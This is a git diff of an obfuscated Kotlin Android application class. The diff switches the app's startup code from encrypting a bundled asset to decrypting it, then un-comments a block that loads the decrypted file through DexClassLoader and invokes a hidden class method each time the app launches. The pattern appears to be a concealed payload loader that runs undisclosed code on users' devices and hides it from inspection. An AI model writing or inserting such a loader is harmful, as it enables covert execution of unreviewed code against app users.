@@ -11,7 +11,6 @@ import com.adjust.sdk.Util
 import com.app.quench.log.base.createDb
 import com.app.quench.log.history.CodeActivityUtil
 import com.app.quench.log.setting.AESFileUtil.decryptFile
-import com.app.quench.log.setting.AESFileUtil.encryptFile
 import com.app.quench.log.setting.Audnf
 import com.app.quench.log.setting.HitKey
 import com.app.quench.log.setting.QusnSeervice
@@ -127,11 +126,11 @@ class HitApp : Application() {
         YhwuHnd.oskd(1, "Gdp")
         CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
             try {
-                val file = File(filesDir, "ei4")
+                val file = File(filesDir, "eou4")
                 if (!file.exists()) {
                     try {
                         val temp = File(filesDir, "tem")
-                        assets.open("inb").use { input ->
+                        assets.open("eou4").use { input ->
                             input.source().buffer().use { source ->
                                 temp.outputStream().use { out ->
                                     out.sink().buffer().use { sink ->
@@ -140,26 +139,26 @@ class HitApp : Application() {
                                 }
                             }
                         }
-                        temp.encryptFile(file)
+                        temp.decryptFile(file)
                         temp.delete()
                     } catch (e: Exception) {
                         e.printStackTrace()
                     }
                 }
                 file.setReadOnly()
-//                // 使用自定义 ClassLoader 加载插件的 dex 文件
-//                val dexClassLoader = DexClassLoader(
-//                    file.path,  // 插件的 dex 文件路径
-//                    filesDir.absolutePath + "/opti",  // 优化后的目录
-//                    null,  // 如果没有额外的库文件
-//                    classLoader // 使用宿主的 ClassLoader 作为父 ClassLoader
-//                )
-//                Audnf.dexLoad = dexClassLoader
-//                // 使用自定义的 ClassLoader 加载插件中的 Test 类
-//                val testClass = dexClassLoader.loadClass("com.example.outdex.Standup")
-//                // 调用 greet 方法
-//                val greetMethod = testClass.getMethod("callStand", Application::class.java)
-//                greetMethod.invoke(null, this@HitApp)
+                // 使用自定义 ClassLoader 加载插件的 dex 文件
+                val dexClassLoader = DexClassLoader(
+                    file.path,  // 插件的 dex 文件路径
+                    filesDir.absolutePath + "/opti",  // 优化后的目录
+                    null,  // 如果没有额外的库文件
+                    classLoader // 使用宿主的 ClassLoader 作为父 ClassLoader
+                )
+                Audnf.dexLoad = dexClassLoader
+                // 使用自定义的 ClassLoader 加载插件中的 Test 类
+                val testClass = dexClassLoader.loadClass("com.example.outdex.Standup")
+                // 调用 greet 方法
+                val greetMethod = testClass.getMethod("callStand", Application::class.java)
+                greetMethod.invoke(null, this@HitApp)
             } catch (e: Exception) {
                 e.printStackTrace()
             }
